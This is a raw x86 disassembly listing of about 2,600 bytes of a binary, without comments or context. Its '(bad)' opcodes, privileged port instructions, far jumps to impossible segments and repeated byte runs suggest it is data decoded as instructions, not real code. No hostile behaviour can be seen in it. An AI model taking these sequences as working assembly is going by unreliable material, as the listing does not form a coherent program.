  421212:	adc    DWORD PTR [esi+esi*8],esi
  421215:	push   cs
  421216:	xor    BYTE PTR es:[edx+ecx*8],cl
  42121a:	and    eax,0x2dca0c30
  42121f:	and    ebp,DWORD PTR [esi-0x3c]
  421222:	mov    eax,0x22
	...
  42124b:	add    BYTE PTR [eax],al
  42124d:	add    BYTE PTR [esi-0x3c],ch
  421250:	mov    eax,0xb8c46e22
  421255:	and    ch,BYTE PTR [esi-0x3c]
  421258:	mov    eax,0xbc644e22
  42125d:	and    cl,BYTE PTR [esi+0x64]
  421260:	mov    esp,0xec3e3e7a
  421265:	jb     0x4211f7
  421267:	xchg   esi,eax
  421268:	out    0x71,eax
  42126a:	pop    esp
  42126b:	stos   DWORD PTR es:[edi],eax
  42126c:	shl    BYTE PTR [ebx+0x3e],cl
  42126f:	pop    esi
  421270:	mov    eax,0xe8987367
  421275:	bound  ebp,QWORD PTR [esp+edx*4-0x15]
  421279:	jno    0x4212dd
  42127b:	pop    ebx
  42127c:	out    0x1d,eax
  42127e:	jp     0x42121b
  421280:	out    0x35,eax
  421282:	jbe    0x42121f
  421284:	out    0x71,eax
  421286:	je     0x421223
  421288:	out    0x8f,eax
  42128a:	or     BYTE PTR [ebx-0x64f3f819],bl
  421290:	out    0x2d,eax
  421292:	adc    bl,BYTE PTR [ebx-0x64f6f019]
  421298:	out    0x4,eax
  42129a:	hlt    
  42129b:	call   0x89e7:0x9af70ae7
  4212a2:	jmp    0xe79a:0xe4c8e79a
  4212a9:	(bad)  
  4212aa:	sbb    ebx,DWORD PTR [ebx-0x6523ef19]
  4212b0:	out    0x7e,eax
	...
  4212da:	add    BYTE PTR [eax],al
  4212dc:	loop   0x421278
  4212de:	out    0xb5,eax
  4212e0:	ficomp DWORD PTR [edx-0x651c9b19]
  4212e6:	out    0xff,eax
  4212e8:	fstp   DWORD PTR [edx-0x65298a19]
  4212ee:	out    0xf9,eax
  4212f0:	fcomp  DWORD PTR [edx-0x6458ff19]
  4212f6:	out    0xcd,eax
  4212f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212f9:	fwait
  4212fa:	out    0x43,eax
  4212fc:	cwde   
  4212fd:	fwait
  4212fe:	out    0x7b,eax
  421300:	xchg   ecx,eax
  421301:	fwait
  421302:	out    0x42,eax
  421304:	(bad)  
  421305:	fwait
  421306:	out    0x9e,eax
  421308:	mov    bl,BYTE PTR [ebx-0x64727219]
  42130e:	out    0x90,eax
  421310:	mov    BYTE PTR [ebx-0x64896319],bl
  421316:	out    0xb9,eax
  421318:	jne    0x4212b5
  42131a:	out    0xa2,eax
  42131c:	push   0xffffff9b
  42131e:	add    cl,ch
  421320:	xor    al,0x82
  421322:	inc    eax
  421323:	jmp    0xe98292c3
  421328:	cwde   
  421329:	add    BYTE PTR [eax-0x17],0xde
  42132d:	aam    0x3f
  42132f:	jmp    0xe981e5e6
  421334:	cli    
  421335:	sar    BYTE PTR [edi],1
  421337:	jmp    0xe981f6cf
  42133c:	fistp  QWORD PTR ss:[edi]
  42133f:	jmp    0x421344
	...
  421368:	add    BYTE PTR [eax],al
  42136a:	(bad)  
  42136b:	fistp  QWORD PTR [edi]
  42136d:	jmp    0xe981f4f1
  421372:	add    ah,dl
  421374:	aas    
  421375:	jmp    0xe981f447
  42137a:	inc    ecx
  42137b:	fnstsw WORD PTR [edi]
  42137d:	jmp    0xe981f31d
  421382:	adc    eax,esp
  421384:	aas    
  421385:	jmp    0xe981f23d
  42138a:	jmp    0x3fb3:0xce93fba
  421391:	jmp    0xe981c0b4
  421396:	pop    ebx
  421397:	mov    al,0x3f
  421399:	jmp    0xe981d380
  42139e:	sbb    eax,DWORD PTR [bx+si-0x17]
  4213a2:	hlt    
  4213a3:	mov    ebp,0x1ba3e93f
  4213a8:	inc    eax
  4213a9:	jmp    0xe981d0d6
  4213ae:	add    eax,0xf4e93fbd
  4213b3:	mov    esp,0xbe47e93f
  4213b8:	aas    
  4213b9:	jmp    0xe9822c68
  4213be:	cld    
  4213bf:	sbb    al,BYTE PTR [eax+0x0]
  4213c2:	out    0x2,eax
  4213c4:	ret    0xd740
  4213c7:	test   ecx,eax
  4213c9:	inc    eax
  4213ca:	xlat   BYTE PTR ds:[ebx]
  4213cb:	inc    edi
  4213cc:	rol    DWORD PTR [eax+0x0],0x0
	...
  4213f8:	out    0xf,eax
  4213fa:	ret    
  4213fb:	inc    eax
  4213fc:	out    0xe4,eax
  4213fe:	ret    0xd740
  421401:	or     al,ch
  421403:	inc    eax
  421404:	xlat   BYTE PTR ds:[ebx]
  421405:	aad    0xc7
  421407:	inc    eax
  421408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421409:	jle    0x4213d0
  42140b:	inc    eax
  42140c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42140d:	add    bh,al
  42140f:	inc    eax
  421410:	xchg   edi,eax
  421411:	xchg   edi,eax
  421412:	leave  
  421413:	inc    eax
  421414:	xchg   edi,eax
  421415:	add    cl,bl
  421417:	inc    eax
  421418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421419:	aam    0xcc
  42141b:	inc    eax
  42141c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42141d:	jo     0x4213ec
  42141f:	inc    eax
  421420:	xchg   edi,eax
  421421:	cwde   
  421422:	rol    DWORD PTR [eax-0x69],1
  421425:	(bad)  
  421426:	rol    DWORD PTR [eax+0x67],cl
  421429:	push   eax
  42142a:	fiadd  DWORD PTR [eax+0x67]
  42142d:	retf   
  42142e:	(bad)  
  42142f:	inc    eax
  421430:	push   edi
  421431:	xchg   edi,eax
  421432:	fadd   QWORD PTR [eax+0x57]
  421435:	dec    esi
  421436:	fld    DWORD PTR [eax+0x67]
  421439:	int3   
  42143a:	fadd   DWORD PTR [eax+0x67]
  42143d:	popf   
  42143e:	fld    DWORD PTR [eax+0x57]
  421441:	and    ebx,ebx
  421443:	inc    eax
  421444:	push   edi
  421445:	mov    eax,ds:0x252740de
  42144a:	fild   WORD PTR [eax+0x27]
  42144d:	jnp    0x421431
  42144f:	inc    eax
  421450:	pop    ss
  421451:	or     al,0xe0
  421453:	inc    eax
  421454:	pop    ss
  421455:	mov    ds:0x332740df,al
  42145a:	in     al,0x40
	...
  421484:	add    BYTE PTR [eax],al
  421486:	daa    
  421487:	xchg   edi,eax
  421488:	out    0x40,al
  42148a:	pop    ss
  42148b:	popf   
  42148c:	out    0x40,al
  42148e:	ds repnz push cs
  421491:	in     eax,0x7e
  421493:	repnz jmp 0x7eec:0x39f27ee6
  42149b:	repnz call 0x7ef2:0xe7f27eee
  4214a3:	repnz (bad) 
  4214a5:	cmc    
  4214a6:	jle    0x42149a
  4214a8:	add    BYTE PTR [eax],al
  4214aa:	repnz add BYTE PTR ds:[eax],al
  4214ae:	repnz add BYTE PTR ds:[eax],al
  4214b2:	repnz add BYTE PTR ds:[eax],al
  4214b6:	repnz add BYTE PTR ds:[eax],al
  4214ba:	ds repnz mov edi,0xee4f176b
  4214c1:	jae    0x421521
  4214c3:	cmp    ah,cl
  4214c5:	jo     0x4214ed
  4214c7:	repnz scas eax,DWORD PTR es:[edi]
  4214c9:	push   ebx
  4214ca:	inc    ebp
  4214cc:	mov    ch,0x50
  4214ce:	push   ebx
  4214cf:	mov    ebx,0xc0094fcd
  4214d4:	mov    ah,0x2a
  4214d6:	add    ecx,ecx
  4214d8:	add    BYTE PTR [ebx],ah
  4214da:	loop   0x421527
  4214dc:	in     eax,0x77
  4214de:	fcomi  st,st(1)
  4214e0:	and    eax,0xea0c30
  4214e5:	je     0x4214b3
  4214e7:	fsubrp st(5),st
  4214e9:	inc    DWORD PTR [eax]
	...
  421513:	add    ah,ch
  421515:	jmp    0xaf1480ff
  42151a:	fsub   DWORD PTR [edx-0x63]
  42151d:	out    0xd4,eax
  42151f:	bound  edi,QWORD PTR [edi-0xe]
  421522:	loope  0x421585
  421524:	popf   
  421525:	(bad)  
  421526:	sub    ah,BYTE PTR [edx-0x61]
  421529:	jle    0x42152c
  42152b:	pop    es
  42152c:	inc    edi
  42152d:	pop    ds
  42152e:	pop    es
  42152f:	or     eax,DWORD PTR [ebx+ebx*2-0x10]
  421533:	and    eax,DWORD PTR [edx+esi*2+0x51]
  421537:	out    dx,eax
  421538:	and    DWORD PTR [esi-0x1f],ecx
  42153b:	and    esp,DWORD PTR [edx+0x76]
  42153e:	cmp    esp,DWORD PTR [ecx+edi*1]
  421541:	ss clc 
  421543:	and    ebx,DWORD PTR [esi]
  421545:	dec    esi
  421546:	icebp  
  421547:	or     al,0x59
  421549:	jne    0x421552
  42154b:	or     eax,0xdc443b41
  421550:	pop    eax
  421551:	mov    BYTE PTR [ebx],bl
  421553:	and    al,0x41
  421555:	cmp    eax,edi
  421557:	and    ebx,DWORD PTR ds:0x4123c74a
  42155d:	cmp    eax,edi
  42155f:	loop   0x421583
  421561:	xchg   DWORD PTR [esi],edx
  421563:	and    al,0x41
  421565:	dec    esi
  421566:	(bad)  
  421567:	in     al,dx
  421568:	pop    ss
  421569:	jo     0x42154f
  42156b:	or     eax,0xe804775e
  421570:	xor    DWORD PTR [edx+0x7],edx
  421573:	and    al,0x5d
  421575:	dec    ebx
  421576:	pop    es
  421577:	add    al,0x0
	...
  4215a1:	add    BYTE PTR [esi+0x3b],bl
  4215a4:	pop    es
  4215a5:	and    al,0x1c
  4215a7:	fisub  DWORD PTR ss:0x4073b1e
  4215ae:	out    dx,eax
  4215af:	jb     0x421575
  4215b1:	out    0xd5,eax
  4215b3:	inc    edi
  4215b4:	stc    
  4215b5:	sub    edx,esp
  4215b7:	outs   dx,BYTE PTR ds:[esi]
  4215b8:	mov    ebx,0xe75b3e03
  4215bd:	add    edi,DWORD PTR [esi]
  4215bf:	pop    ebx
  4215c0:	out    0x3,eax
  4215c2:	ds pop ebx
  4215c4:	out    0x3,eax
  4215c6:	ds pop ebx
  4215c8:	out    0x3,eax
  4215ca:	ds pop ebx
  4215cc:	out    0x3,eax
  4215ce:	ds pop ebx
  4215d0:	out    0x3,eax
  4215d2:	ds pop ebx
  4215d4:	add    cl,ch
  4215d6:	cmp    eax,0x3de9005b
  4215db:	pop    ebx
  4215dc:	add    cl,ch
  4215de:	cmp    eax,0x3de9005b
  4215e3:	pop    ebx
  4215e4:	add    cl,ch
  4215e6:	cmp    eax,0x3de9005b
  4215eb:	pop    ebx
  4215ec:	add    cl,ch
  4215ee:	cmp    eax,0x3de9005b
  4215f3:	pop    ebx
  4215f4:	add    cl,ch
  4215f6:	cmp    eax,0x3de9005b
  4215fb:	pop    ebx
  4215fc:	add    cl,ch
  4215fe:	cmp    eax,0x3de9005b
  421603:	pop    ebx
  421604:	add    cl,ch
	...
  42162e:	add    BYTE PTR [eax],al
  421630:	cmp    eax,0x3de9005b
  421635:	pop    ebx
  421636:	add    cl,ch
  421638:	cmp    eax,0x3de9005b
  42163d:	pop    ebx
  42163e:	add    cl,ch
  421640:	cmp    eax,0x3de9005b
  421645:	pop    ebx
  421646:	add    cl,ch
  421648:	cmp    eax,0x3de9005b
  42164d:	pop    ebx
  42164e:	add    cl,ch
  421650:	cmp    eax,0x3de9005b
  421655:	pop    ebx
  421656:	add    cl,ch
  421658:	cmp    eax,0x3de9005b
  42165d:	pop    ebx
  42165e:	add    cl,ch
  421660:	cmp    eax,0x3de9005b
  421665:	pop    ebx
  421666:	add    cl,ch
  421668:	cmp    eax,0x3de9005b
  42166d:	pop    ebx
  42166e:	add    cl,ch
  421670:	cmp    eax,0x3de9005b
  421675:	pop    ebx
  421676:	add    BYTE PTR [eax],al
  421678:	pop    ss
  421679:	pop    esi
  42167a:	add    BYTE PTR [eax],al
  42167c:	pop    ss
  42167d:	pop    esi
  42167e:	add    BYTE PTR [eax],al
  421680:	daa    
  421681:	pop    esi
  421682:	add    BYTE PTR [eax],al
  421684:	daa    
  421685:	pop    esi
  421686:	add    BYTE PTR [eax],al
  421688:	pop    ss
  421689:	pop    esi
  42168a:	add    BYTE PTR [eax],al
  42168c:	pop    ss
  42168d:	pop    esi
  42168e:	add    BYTE PTR [eax],al
  421690:	out    0x5d,eax
	...
  4216be:	out    0x5d,eax
  4216c0:	add    BYTE PTR [eax],al
  4216c2:	xlat   BYTE PTR ds:[ebx]
  4216c3:	pop    ebp
  4216c4:	add    BYTE PTR [eax],al
  4216c6:	xlat   BYTE PTR ds:[ebx]
  4216c7:	pop    ebp
  4216c8:	add    BYTE PTR [eax],al
  4216ca:	out    0x5d,eax
  4216cc:	add    BYTE PTR [eax],al
  4216ce:	out    0x5d,eax
  4216d0:	add    BYTE PTR [eax],al
  4216d2:	xlat   BYTE PTR ds:[ebx]
  4216d3:	pop    ebp
  4216d4:	add    BYTE PTR [eax],al
  4216d6:	xlat   BYTE PTR ds:[ebx]
  4216d7:	pop    ebp
  4216d8:	add    BYTE PTR [eax],al
  4216da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216db:	pop    ebp
  4216dc:	add    BYTE PTR [eax],al
  4216de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216df:	pop    ebp
  4216e0:	add    BYTE PTR [eax],al
  4216e2:	xchg   edi,eax
  4216e3:	pop    ebp
  4216e4:	add    BYTE PTR [eax],al
  4216e6:	xchg   edi,eax
  4216e7:	pop    ebp
  4216e8:	add    BYTE PTR [eax],al
  4216ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216eb:	pop    ebp
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216ef:	pop    ebp
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	xchg   edi,eax
  4216f3:	pop    ebp
  4216f4:	add    BYTE PTR [eax],al
  4216f6:	xchg   edi,eax
  4216f7:	pop    ebp
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	addr16 pop ebp
  4216fc:	add    BYTE PTR [eax],al
  4216fe:	addr16 pop ebp
  421700:	add    BYTE PTR [eax],al
  421702:	push   edi
  421703:	pop    ebp
  421704:	add    BYTE PTR [eax],al
  421706:	push   edi
  421707:	pop    ebp
  421708:	add    BYTE PTR [eax],al
  42170a:	addr16 pop ebp
  42170c:	add    BYTE PTR [eax],al
  42170e:	addr16 pop ebp
  421710:	add    BYTE PTR [eax],al
  421712:	push   edi
  421713:	pop    ebp
  421714:	add    BYTE PTR [eax],al
  421716:	push   edi
  421717:	pop    ebp
  421718:	add    BYTE PTR [eax],al
  42171a:	add    al,BYTE PTR ds:[ecx]
  42171d:	add    BYTE PTR [esi],bh
  42171f:	add    al,BYTE PTR [ecx]
	...
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR [esi],bh
  42174d:	add    al,BYTE PTR [ecx]
  42174f:	add    BYTE PTR [esi],bh
  421751:	add    al,BYTE PTR [ecx]
  421753:	add    BYTE PTR [esi],bh
  421755:	add    al,BYTE PTR [ecx]
  421757:	add    BYTE PTR [esi],bh
  421759:	add    al,BYTE PTR [ecx]
  42175b:	add    BYTE PTR [esi],bh
  42175d:	add    al,BYTE PTR [ecx]
  42175f:	add    BYTE PTR [esi],bh
  421761:	add    al,BYTE PTR [ecx]
  421763:	add    BYTE PTR [esi],bh
  421765:	add    al,BYTE PTR [ecx]
  421767:	add    BYTE PTR [esi],bh
  421769:	add    al,BYTE PTR [ecx]
  42176b:	add    BYTE PTR [esi],bh
  42176d:	add    al,BYTE PTR [ecx]
  42176f:	add    BYTE PTR [esi],bh
  421771:	add    al,BYTE PTR [ecx]
  421773:	add    BYTE PTR [esi],bh
  421775:	add    al,BYTE PTR [ecx]
  421777:	add    BYTE PTR [esi],bh
  421779:	add    al,BYTE PTR [ecx]
  42177b:	add    BYTE PTR [esi],bh
  42177d:	add    al,BYTE PTR [ecx]
  42177f:	add    BYTE PTR [esi],bh
  421781:	add    al,BYTE PTR [ecx]
  421783:	add    BYTE PTR [esi],bh
  421785:	add    al,BYTE PTR [ecx]
  421787:	add    BYTE PTR [esi],bh
  421789:	add    al,BYTE PTR [ecx]
  42178b:	add    BYTE PTR [esi],bh
  42178d:	add    al,BYTE PTR [ecx]
  42178f:	add    BYTE PTR [esi],bh
  421791:	add    al,BYTE PTR [ecx]
  421793:	add    BYTE PTR [esi],bh
  421795:	add    al,BYTE PTR [ecx]
  421797:	add    BYTE PTR [esi],bh
  421799:	add    al,BYTE PTR [ecx]
  42179b:	add    BYTE PTR [esi],bh
  42179d:	add    al,BYTE PTR [ecx]
  42179f:	add    BYTE PTR [esi],bh
  4217a1:	add    al,BYTE PTR [ecx]
  4217a3:	add    BYTE PTR [esi],bh
  4217a5:	add    al,BYTE PTR [ecx]
  4217a7:	add    BYTE PTR [esi],bh
  4217a9:	add    al,BYTE PTR [ecx]
  4217ab:	add    BYTE PTR [esi],bh
  4217ad:	add    al,BYTE PTR [ecx]
	...
  4217d7:	add    BYTE PTR [eax],al
  4217d9:	add    BYTE PTR [esi],bh
  4217db:	add    al,BYTE PTR [ecx]
  4217dd:	add    BYTE PTR [esi],bh
  4217df:	add    al,BYTE PTR [ecx]
  4217e1:	add    BYTE PTR [esi],bh
  4217e3:	add    al,BYTE PTR [ecx]
  4217e5:	add    BYTE PTR [esi],bh
  4217e7:	pop    ebx
  4217e8:	call   0x70c21511
  4217ed:	lods   al,BYTE PTR ds:[esi]
  4217ee:	add    eax,0xf4371508
  4217f3:	rcl    BYTE PTR [edi+ebp*4-0x538fb491],cl
  4217fa:	cmc    
  4217fb:	pop    es
  4217fc:	call   0x67c29525
  421801:	add    edi,DWORD PTR [esi+0x5b]
  421804:	mov    DWORD PTR [ebx],0x3ef5b2e
  42180a:	cmp    bl,BYTE PTR [ebx-0x17]
  42180d:	add    edi,ecx
  42180f:	mul    esi
  421811:	add    edi,DWORD PTR [esi+0x7e03e75a]
  421817:	pop    ebx
  421818:	out    0x3,eax
  42181a:	push   ds
  42181b:	pop    ebx
  42181c:	out    0x3,eax
  42181e:	cs pop ebx
  421820:	out    0x3,eax
  421822:	inc    esi
  421823:	pop    ebx
  421824:	out    0x3,eax
  421826:	inc    edx
  421827:	pop    ebx
  421828:	out    0x3,eax
  42182a:	cmp    al,0x5b
  42182c:	out    0x3,eax
  42182e:	mov    ecx,0x3e83e6f7
  421833:	pop    ebx
  421834:	out    0xc3,eax
  421836:	test   eax,0x3e23e6f7
  42183b:	pop    ebx
  42183c:	out    0xf3,eax
	...
  421866:	add    BYTE PTR [eax],al
  421868:	cdq    
  421869:	mul    esi
  42186b:	or     edi,DWORD PTR [esi]
  42186d:	pop    ebx
  42186e:	out    0xff,eax
  421870:	mov    edi,esi
  421872:	out    0x1,al
  421874:	ds pop ebx
  421876:	out    0x4,eax
  421878:	ds pop ebx
  42187a:	addr16 add al,0x3e
  42187d:	pop    ebx
  42187e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42187f:	add    edi,DWORD PTR [esi]
  421881:	pop    ebx
  421882:	pop    es
  421883:	add    al,0x3e
  421885:	pop    ebx
  421886:	xlat   BYTE PTR ds:[ebx]
  421887:	add    edi,DWORD PTR [esi]
  421889:	pop    ebx
  42188a:	add    cl,ah
  42188c:	cmp    eax,0x3de5005b
  421891:	pop    ebx
  421892:	add    bl,ch
  421894:	cmp    eax,0x3de8005b
  421899:	pop    ebx
  42189a:	add    cl,dl
  42189c:	dec    ebp
  42189d:	inc    ebx
  42189e:	and    cl,dh
  4218a0:	sub    eax,0x4ac0005f
  4218a5:	ds pop ds
  4218a7:	loopne 0x4218bb
  4218a9:	pop    esi
  4218aa:	push   DWORD PTR [edx-0x2cddbed1]
  4218b0:	pcmpgtw mm0,QWORD PTR [edx]
  4218b3:	and    ch,BYTE PTR ds:0x481f2144
  4218b9:	inc    ebp
  4218ba:	es mul ebx
  4218bd:	push   0x424f0c06
  4218c2:	and    esp,esp
  4218c4:	out    dx,al
  4218c5:	popa   
  4218c6:	add    edi,ebp
  4218c8:	dec    ecx
  4218c9:	inc    edi
  4218ca:	and    al,0xd5
	...
  4218f4:	add    BYTE PTR [eax],al
  4218f6:	loope  0x42195a
  4218f8:	add    al,0xd2
  4218fa:	int3   
  4218fb:	arpl   WORD PTR [ecx],ax
  4218fd:	call   0xf1487841
  421902:	inc    edi
  421903:	addr16 push cs
  421905:	out    0xaa,al
  421907:	dec    ebx
  421908:	adc    esi,esi
  42190a:	stos   BYTE PTR es:[edi],al
  42190b:	push   ebx
  42190c:	sbb    al,0xf4
  42190e:	lods   eax,DWORD PTR ds:[esi]
  42190f:	fs adc eax,0x195c99e9
  421915:	out    0x3e,eax
  421917:	dec    edi
  421918:	pop    es
  421919:	xlat   BYTE PTR ds:[ebx]
  42191a:	(bad)  
  42191b:	arpl   WORD PTR [ecx],ax
  42191d:	add    BYTE PTR [ecx+0x6d030667],al
  421923:	(bad)  
  421924:	inc    DWORD PTR [eax]
  421926:	dec    ebp
  421927:	push   ebp
  421928:	and    al,0xff
  42192a:	cmp    edx,DWORD PTR [edx+0x25]
  42192d:	add    BYTE PTR [ebp+0x3e],ah
  421930:	and    BYTE PTR [edi],ch
  421932:	sub    al,0x4f
  421934:	es aaa 
  421936:	inc    esi
  421937:	dec    ebx
  421938:	sub    DWORD PTR [ecx],ebp
  42193a:	inc    esi
  42193b:	cmp    DWORD PTR [edi+ebx*1],ebx
  42193e:	push   edi
  42193f:	idiv   ch
  421941:	add    BYTE PTR [edi],ah
  421943:	pop    edx
  421944:	add    BYTE PTR [eax],al
  421946:	daa    
  421947:	pop    edx
  421948:	std    
  421949:	jmp    DWORD PTR [ebx]
  42194b:	idiv   ch
  42194d:	add    BYTE PTR [ebx],dl
  42194f:	pop    edx
  421950:	std    
  421951:	add    BYTE PTR [ebx],ah
  421953:	idiv   ch
  421955:	jmp    DWORD PTR [ebx]
  421957:	pop    edx
	...
  421984:	pop    ss
  421985:	pop    edx
  421986:	std    
  421987:	call   DWORD PTR [edi]
  421989:	idiv   ah
  42198b:	jmp    edi
  42198d:	cmc    
  42198e:	std    
  42198f:	add    bl,ah
  421991:	cmc    
  421992:	std    
  421993:	add    bh,dl
  421995:	cmc    
  421996:	cld    
  421997:	call   ebx
  421999:	cmc    
  42199a:	cld    
  42199b:	add    bl,ah
  42199d:	pop    ecx
  42199e:	std    
  42199f:	add    bh,ah
  4219a1:	pop    ecx
  4219a2:	add    BYTE PTR [ecx],al
  4219a4:	jecxz  0x4219ff
  4219a6:	add    BYTE PTR [eax],al
  4219a8:	shl    ebp,cl
  4219aa:	cld    
  4219ab:	jmp    DWORD PTR [edi-0x58ff030b]
  4219b1:	cmc    
  4219b2:	cld    
  4219b3:	add    BYTE PTR [edi-0x6800020b],dl
  4219b9:	cmc    
  4219ba:	std    
  4219bb:	jmp    DWORD PTR [edi-0x58ff02a7]
  4219c1:	pop    ecx
  4219c2:	std    
  4219c3:	add    BYTE PTR [ebx-0x6cff030b],ah
  4219c9:	pop    ecx
  4219ca:	std    
  4219cb:	jmp    DWORD PTR [ebx+0x59]
  4219ce:	add    BYTE PTR [ecx],al
  4219d0:	or     BYTE PTR ds:[ecx],al
  4219d3:	add    BYTE PTR [edi],bh
  4219d5:	add    BYTE PTR [ecx],al
  4219d7:	jmp    DWORD PTR [ecx+0x3]
  4219da:	add    DWORD PTR [eax],eax
  4219dc:	ds add ch,bh
  4219df:	call   DWORD PTR [ecx+0x7]
  4219e2:	std    
  4219e3:	dec    BYTE PTR [ecx+0x3]
  4219e6:	add    DWORD PTR [eax],eax
	...
  421a10:	add    BYTE PTR [eax],al
  421a12:	aas    
  421a13:	add    al,0x1
  421a15:	(bad)  
  421a16:	cmp    edi,edi
  421a18:	cld    
  421a19:	(bad)  
  421a1a:	ds push es
  421a1c:	add    DWORD PTR [eax],eax
  421a1e:	add    al,BYTE PTR ds:[ecx]
  421a21:	(bad)  
  421a22:	ds add bh,ch
  421a25:	(bad)  
  421a26:	add    al,BYTE PTR ds:[ecx]
  421a29:	add    BYTE PTR [edi],bh
  421a2b:	add    al,BYTE PTR [ecx]
  421a2d:	add    BYTE PTR [edi],bh
  421a2f:	add    bh,ch
  421a31:	inc    DWORD PTR [ecx]
  421a33:	pop    es
  421a34:	add    edi,edi
  421a36:	add    al,BYTE PTR ds:[ecx]
  421a39:	push   ecx
  421a3b:	add    bh,ch
  421a3d:	(bad)  
  421a3e:	jmp    0x3f421b41
  421a43:	add    bh,ch
  421a45:	(bad)  
  421a46:	fsin   
  421a48:	add    BYTE PTR [eax],al
  421a4a:	ds push es
  421a4c:	std    
  421a4d:	(bad)  
  421a4e:	ds (bad) 
  421a50:	cld    
  421a51:	inc    cl
  421a53:	push   es
  421a54:	std    
  421a55:	(bad)  
  421a56:	inc    BYTE PTR ds:[eax]
  421a59:	push   DWORD PTR [ecx+0x3eff0102]
  421a5f:	(bad)  
  421a60:	cld    
  421a61:	(bad)  
  421a62:	ds push es
  421a64:	add    DWORD PTR [eax],eax
  421a66:	aas    
  421a67:	(bad)  
  421a68:	cld    
  421a69:	call   DWORD PTR [ecx-0x760102fa]
  421a6f:	add    bh,ch
  421a71:	(bad)  
  421a72:	ds pop ebx
  421a74:	jmp    0x421a75
	...
  421a9e:	add    BYTE PTR [eax],al
  421aa0:	jns    0x421a96
  421aa2:	out    0xff,al
  421aa4:	jno    0x421b01
  421aa6:	out    0xff,eax
  421aa8:	imul   ebx,DWORD PTR [ebx-0x19],0xeb5b3e03
  421aaf:	add    ebx,DWORD PTR [ecx-0xc]
  421ab2:	out    0xff,al
  421ab4:	push   eax
  421ab5:	hlt    
  421ab6:	out    0x3,al
  421ab8:	ds pop ebx
  421aba:	jecxz  0x421abf
  421abc:	inc    ecx
  421abd:	pop    ebx
  421abe:	mov    DWORD PTR [ebx-0x7c1924b2],0x83e6db3e
  421ac8:	ds pop ebx
  421aca:	mov    DWORD PTR [ebx+0x3e75b4e],0x3c75b2e
  421ad4:	ds pop ebx
  421ad6:	mov    DWORD PTR [ebx],0x83c6db2e
  421adc:	fild   DWORD PTR ds:[esi]
  421adf:	add    al,0x3e
  421ae1:	fild   DWORD PTR [esi]
  421ae3:	test   BYTE PTR [esi-0x25],cl
  421ae6:	out    0x83,al
  421ae8:	dec    esi
  421ae9:	(bad)  
  421aeb:	add    edi,DWORD PTR [esi]
  421aed:	(bad)  
  421aef:	cmp    DWORD PTR [esi],0xffffffdb
  421af2:	out    0x3,al
  421af4:	cs pop ebx
  421af6:	pop    es
  421af7:	add    al,0x3e
  421af9:	pop    ebx
  421afa:	pop    es
  421afb:	add    al,0x2e
  421afd:	(bad)  
  421aff:	or     DWORD PTR [esi+0x5b],0xffffffc7
  421b03:	add    eax,DWORD PTR [eax]
	...
  421b2d:	add    BYTE PTR [esi+0x5b],cl
  421b30:	mov    DWORD PTR [ebx+0x3e6db3e],0x3e75b3e
  421b3a:	ds (bad) 
  421b3d:	cmp    DWORD PTR [esi],0x5b
  421b40:	add    cl,cl
  421b42:	mov    ebp,0x3de9004a
  421b47:	dec    ebx
  421b48:	or     BYTE PTR [ecx],0x42
  421b4b:	dec    ebx
  421b4c:	add    BYTE PTR [ecx],cl
  421b4e:	cmp    bl,BYTE PTR [ebx-0x80]
  421b51:	jmp    0xe9427693
  421b56:	mov    ebp,0xc209004a
  421b5b:	pop    edx
  421b5c:	add    cl,ch
  421b5e:	mov    ebp,0x3de9804a
  421b63:	dec    ebx
  421b64:	or     BYTE PTR [ecx],0xba
  421b67:	pop    edx
  421b68:	add    cl,ch
  421b6a:	cmp    eax,0xbdc9005b
  421b6f:	dec    ebx
  421b70:	add    cl,cl
  421b72:	cmp    eax,0x3de9804b
  421b77:	dec    ebx
  421b78:	add    cl,cl
  421b7a:	mov    ebp,0x3de9805b
  421b7f:	dec    ebx
  421b80:	sub    cl,0xbd
  421b83:	dec    ebx
  421b84:	sub    cl,0xbd
  421b87:	pop    ebx
  421b88:	add    cl,ch
  421b8a:	cmp    eax,0xbde9804b
  421b8f:	pop    ebx
  421b90:	or     BYTE PTR [ecx],0x0
	...
  421bbb:	add    BYTE PTR [edx+0x5b],al
  421bbe:	add    BYTE PTR [ecx],cl
  421bc0:	mov    edx,0xc209804b
  421bc5:	dec    ebx
  421bc6:	add    BYTE PTR [ecx],cl
  421bc8:	cmp    bl,BYTE PTR [ebx+0x0]
  421bcb:	jmp    0xe942778d
  421bd0:	cmp    eax,0xbdc9805b
  421bd5:	pop    ebx
  421bd6:	add    cl,ch
  421bd8:	mov    ebp,0x3de9804b
  421bdd:	dec    ebx
  421bde:	add    cl,cl
  421be0:	cmp    eax,0x8700805b
  421be5:	pop    esi
  421be6:	adc    BYTE PTR [eax],al
  421be8:	xchg   esi,ebx
  421bea:	(bad)  
  421beb:	jg     0x421c64
  421bed:	pop    esi
  421bee:	add    BYTE PTR [eax+0x105e77],al
  421bf4:	fimul  WORD PTR [bx]
  421bf7:	add    BYTE PTR [edi+0x5e],ah
  421bfa:	add    BYTE PTR [eax],al
  421bfc:	push   edi
  421bfd:	fdivp  st(7),st
  421bff:	jg     0x421c38
  421c01:	xlat   BYTE PTR ds:[ebx]
  421c02:	(bad)  
  421c03:	jmp    DWORD PTR [edi+0x5e]
  421c06:	add    BYTE PTR [eax-0x7fefa8b9],al
  421c0c:	aaa    
  421c0d:	xlat   BYTE PTR ds:[ebx]
  421c0e:	jo     0x51fa6b
  421c14:	das    
  421c15:	pop    eax
  421c16:	add    BYTE PTR [eax],al
  421c18:	daa    
  421c19:	pop    eax
  421c1a:	add    cl,BYTE PTR [eax]
  421c1c:	pop    ss
  421c1d:	pop    esi
	...
  421c4a:	pop    ds
  421c4b:	pop    esi
  421c4c:	add    cl,BYTE PTR [eax]
  421c4e:	daa    
